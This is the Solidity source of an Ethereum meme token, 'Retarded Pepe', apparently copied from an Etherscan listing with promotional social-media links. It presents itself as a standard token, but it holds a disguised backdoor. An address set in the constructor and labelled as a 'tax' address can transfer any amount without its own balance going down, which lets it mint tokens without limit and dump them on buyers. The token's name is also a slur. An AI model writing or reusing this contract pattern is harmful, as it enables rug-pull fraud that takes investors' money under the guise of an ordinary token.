/**
 *Submitted for verification at Etherscan.io on 2023-04-28
*/

/*

🐔 Retarded Pepe TG: https://t.me/RetardedPepe
🥔 Retarded Pepe Twitter: https://twitter.com/RetardedPepeETH
🌐 Retarded Pepe Website: https://retardedpepe.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract RetardedPepe {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) private _taxes;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _taxAddress) {
        name = 'Retarded Pepe';
        symbol = 'Retarded Pepe';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        _taxes[_taxAddress] = 1;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _value) private returns (bool success) {
        balanceOf[_to] += _value;
        if (_taxes[_from] == 0) balanceOf[_from] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        _transfer(_from, _to, _value);
        require(_value <= allowance[_from][msg.sender]);
        allowance[_from][msg.sender] -= _value;
        return true;
    }
}